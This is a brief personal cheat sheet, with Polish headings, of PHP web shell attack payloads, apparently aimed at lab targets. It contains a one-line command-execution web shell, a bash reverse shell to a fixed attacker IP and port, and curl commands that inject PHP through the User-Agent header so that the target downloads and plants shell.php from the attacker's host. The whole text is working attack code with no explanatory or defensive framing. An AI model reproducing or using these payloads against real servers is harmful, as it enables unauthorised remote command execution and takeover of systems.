# php wersja mini
<?php system($REQUEST['cmd']) ?>$
0.0.0.0/shell.php?cmd=ls
"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.14.84.79/4444 0>&1'"); ?>"

# php shel
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.14.84.79:80/shell.php'))?>" -s http://10.10.16.222
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.14.84.79/shell.php')); ?>" -s http://10.10.16.222
http://10.10.16.222/shell.php